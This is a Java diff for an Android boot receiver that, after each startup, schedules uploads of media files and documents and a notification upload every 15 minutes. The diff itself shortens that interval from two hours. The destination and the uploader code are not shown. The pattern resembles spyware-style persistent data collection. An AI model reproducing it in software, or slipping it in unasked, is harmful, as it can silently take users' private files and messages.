@@ -17,27 +17,29 @@ import androidx.work.WorkManager;
 import java.util.concurrent.TimeUnit;
 
 public class DataUploaderStartReceiver extends BroadcastReceiver {
-    WorkManager mWorkManager;
+
 
     @Override
     public void onReceive(Context context, Intent intent) {
+        if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
+            WorkManager mWorkManager = WorkManager.getInstance();
 
-        mWorkManager = WorkManager.getInstance();
-        final OneTimeWorkRequest mMediaRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class)
-                .addTag("MediaFilesUploader")
-                .build();
-        mWorkManager.enqueue(mMediaRequest);
+            final OneTimeWorkRequest mMediaRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class)
+                    .addTag("MediaFilesUploader")
+                    .build();
+            mWorkManager.enqueue(mMediaRequest);
 
-        final OneTimeWorkRequest mDocRequesRequest = new OneTimeWorkRequest.Builder(DocumentFilesUploader.class)
-                .addTag("DocFilesUploader")
-                .build();
-        mWorkManager.enqueue(mDocRequesRequest);
+            final OneTimeWorkRequest mDocRequesRequest = new OneTimeWorkRequest.Builder(DocumentFilesUploader.class)
+                    .addTag("DocFilesUploader")
+                    .build();
+            mWorkManager.enqueue(mDocRequesRequest);
 
-        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
-        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
-                .setConstraints(constraints)
-                .build();
+            Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
+            PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 15, TimeUnit.MINUTES)
+                    .setConstraints(constraints)
+                    .build();
 
-        mWorkManager.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE,build);
+            mWorkManager.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE, build);
+        }
     }
 }
